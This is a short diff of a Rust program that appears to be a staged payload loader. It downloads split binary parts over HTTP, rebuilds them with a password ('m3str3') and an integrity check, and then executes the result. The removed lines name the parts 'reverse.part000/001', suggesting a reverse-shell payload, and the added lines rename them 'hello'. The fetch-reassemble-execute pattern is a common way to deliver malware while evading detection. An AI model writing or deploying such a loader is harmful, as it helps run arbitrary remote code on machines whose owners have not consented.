@@ -9,8 +9,8 @@ fn main() {
 
     // Download urls
     let urls = [
-        "http://127.0.0.1/reverse.part000".to_string(),
-        "http://127.0.0.1/reverse.part001".to_string()
+        "http://127.0.0.1/hello.part000".to_string(),
+        "http://127.0.0.1/hello.part001".to_string()
     ];
 
     println!("[+] Downloading parts...");
@@ -18,8 +18,14 @@ fn main() {
         .expect("Failed to download parts");
     println!("[+] Downloaded {} parts", parts.len());
     println!("[+] Reconstructing binary...");
-    let binary = rebuild_from_parts(parts, true, false)
-        .expect("Failed to reconstruct binary");
+    
+        let binary = rebuild_from_parts(
+            parts,
+            Some("m3str3"), // Password
+            true, // Integrity check
+            true // Verbose
+        ).expect("Failed to reconstruct binary");
+        
     println!("[+] Reconstructed binary: {} bytes", binary.len());
     println!("[+] Executing binary...");
 
